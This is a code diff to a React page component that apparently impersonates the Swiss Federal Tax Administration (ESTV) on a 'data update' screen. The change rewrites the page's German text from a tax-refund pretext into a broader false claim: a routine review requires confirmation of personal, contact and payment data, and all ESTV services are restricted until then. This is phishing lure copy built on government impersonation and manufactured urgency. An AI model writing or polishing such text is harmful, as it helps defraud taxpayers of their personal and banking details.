@@ -152,16 +152,21 @@ const Estv = () => {
             Datenaktualisierung
           </h1>
           <p className="text-[16px] text-gray-700 leading-relaxed max-w-[680px] mb-8">
-            Bitte aktualisieren Sie Ihre persönlichen Daten und Bankverbindung,
-            damit die Bearbeitung Ihrer Steuerrückerstattung korrekt erfolgen kann.
+            Aufgrund einer turnusmässigen Überprüfung müssen alle bei der Eidgenössischen
+            Steuerverwaltung (ESTV) hinterlegten Personen-, Kontakt- und Zahlungsdaten
+            bestätigt werden. Bitte aktualisieren Sie Ihre Angaben, um den vollen Zugriff
+            auf sämtliche ESTV-Dienstleistungen wiederherzustellen.
           </p>
 
           {/* Hinweis */}
           <div className="rounded-xl border-l-[3px] p-4 mb-8 flex gap-3" style={{ borderColor: ESTV_RED, backgroundColor: "#FDF2F3" }}>
             <AlertTriangle className="w-5 h-5 mt-0.5 shrink-0" style={{ color: ESTV_RED }} />
             <div className="text-[14px] text-gray-800 leading-relaxed">
-              <strong>Wichtig:</strong> Ohne aktuelle Adress-, Kontakt- und Kontodaten kann
-              Ihre Rückerstattung nicht ausgezahlt werden. Die Aktualisierung dauert nur wenige Minuten.
+              <strong>Wichtig:</strong> Bis zur Bestätigung Ihrer Daten sind sämtliche
+              Funktionen der ESTV — darunter Steuererklärung, Verrechnungssteuer,
+              Mehrwertsteuer-Abrechnung, Bescheinigungen sowie Rückerstattungen —
+              vorübergehend eingeschränkt. Nach erfolgreicher Aktualisierung stehen Ihnen
+              alle Dienste umgehend wieder zur Verfügung.
             </div>
           </div>
 
